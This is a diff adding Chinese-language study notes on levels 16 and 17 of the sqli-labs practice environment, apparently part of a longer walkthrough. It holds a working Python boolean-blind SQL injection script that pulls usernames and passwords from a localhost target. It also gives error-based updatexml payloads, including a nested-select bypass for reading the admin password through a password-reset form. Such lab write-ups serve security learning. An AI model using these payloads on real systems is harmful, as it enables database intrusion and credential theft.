@@ -765,3 +765,141 @@ if __name__ == "__main__":
 
 通过python脚本正确遍历出数据库中的内容
 
+## 第十六关
+
+使用Username payload：`aa") or 1 #`判断出注入类型
+
+![image-20210527163352492](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527163352492.png)
+
+页面显示出了success图片，页面并无回显任何数据库信息，只显示报错图片和成功图片，所以可以采用python脚本的post方法布尔盲注
+
+payload：
+
+~~~python
+import time
+import sys
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+
+
+	# select_str = "select database()" #DIY地址
+	# select_str = "select schema_name from information_schema.schemata limit "+str(result_index)+" ,1" #DIY地址,获取所有的数据库
+	# select_str = "select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+" ,1" #DIY地址,获取某个数据库中的所有表
+	# select_str = "select column_name from information_schema.columns where table_schema='security' and table_name='users' limit "+str(result_index)+" ,1" #DIY地址,某张表中所有的字段名称
+	select_str = "select concat(username,'~',password) from security.users limit "+str(result_index)+" ,1" #获取表中的内容
+	# 连接payload
+	sqli_str = '1")^(ascii(mid(('+ select_str +")," + str(char_index) + ",1))>" + str(ascii) + ")#" #DIY地址,获取所有的数据库
+	# print(sqli_str)
+	payload = {"uname":sqli_str,
+			   "passwd":"aaa",
+			   "submit":"Submit"
+			   }  #DIY地址
+
+	return payload
+
+
+def execute(result_index, char_index, ascii):
+	# 连接url
+	url = "http://localhost/sqli-labs/Less-16/"  #DIY地址
+	payload = getPayload(result_index, char_index, ascii)
+	# print(payload)
+	# 检查回显
+	echo = "flag.jpg"            #DIY地址
+	content = requests.post(url, data=payload).text
+	# print(content)
+	time.sleep(0.1)
+	# print(content)
+	if echo in content:
+		return True
+	else:
+		return False
+
+
+def dichotomy(result_index, char_index, left, right):
+	while left < right:
+		# 二分法
+		ascii = int((left + right) / 2)
+		if execute(str(result_index), str(char_index + 1), str(ascii)):
+			left = ascii
+		else:
+			right = ascii
+		# 结束二分
+		if left == right - 1:
+			if execute(str(result_index), str(char_index + 1), str(ascii)):
+				ascii += 1
+				break
+			else:
+				break
+	return chr(ascii)
+
+
+if __name__ == "__main__":
+	for num in range(32):  # 查询结果的数量  #DIY地址
+		count = 0
+		for len in range(32):  # 单条查询结果的长度   #DIY地址
+			count += 1
+			char = dichotomy(num, len, 30, 126)
+			if ord(char) == 31:  # 单条查询结果已被遍历
+				break
+			sys.stdout.write(char)
+			sys.stdout.flush()
+		if count == 1:  # 查询结果已被遍历
+			break
+		sys.stdout.write("\r\n")
+		sys.stdout.flush()
+
+
+~~~
+
+成功使用脚本爆破出表中的值
+
+![image-20210527170429861](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527170429861.png)
+
+## 第十七关
+
+![image-20210527170508219](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527170508219.png)
+
+要求重置密码，我们怎么根据重置密码来获取数据库中的值呢？
+
+这里后台代码是先根据username的值来判断数据库中是否有输入的值，如果有的话，就会执行update语句，更新密码，这里的密码存在注入，由于它是update，所以就不能使用 union select，我们在这里可以使用报错注入
+
+![image-20210527173059828](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527173059828.png)
+
+而且通过语法错误回显可以测试出这一关是单引号字符型注入。但是通过这一关卡的前提是必须知道一个用户名。
+
+获得数据库payload：
+
+~~~
+passwd=admin%27+or+updatexml(1,concat(0x7e,(select+database()),0x7e),1)%23
+~~~
+
+![image-20210527173514622](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527173514622.png)
+
+获取表payload：**注意：这里的updatexml关键字前面是and,这是因为1和报错注入语句要都执行，如果是or，执行完更新密码为1之后，后面的updatexml语句就不会执行**
+
+~~~
+passwd=1'+and+updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema="security"+limit+3,1),0x7e),1)%23
+~~~
+
+![image-20210527174337740](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527174337740.png)
+
+从users表中查询password信息，报错了
+
+![image-20210527175607769](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527175607769.png)
+
+![img](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/1675852-20190526103007361-1980441638.png)
+
+看来是更新信息的表和查信息的表不能同时使用，想办法绕过限制，在里面再嵌套一层select查询使用别名aa
+
+payload：
+
+~~~
+passwd=111'+and+(updatexml(1,concat(0x7e,(select+password+from+(select+password+from+users+where+username="admin")aa),0x7e),1))%23
+~~~
+
+![image-20210527180352717](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527180352717.png)
+
+## 第十八关
+
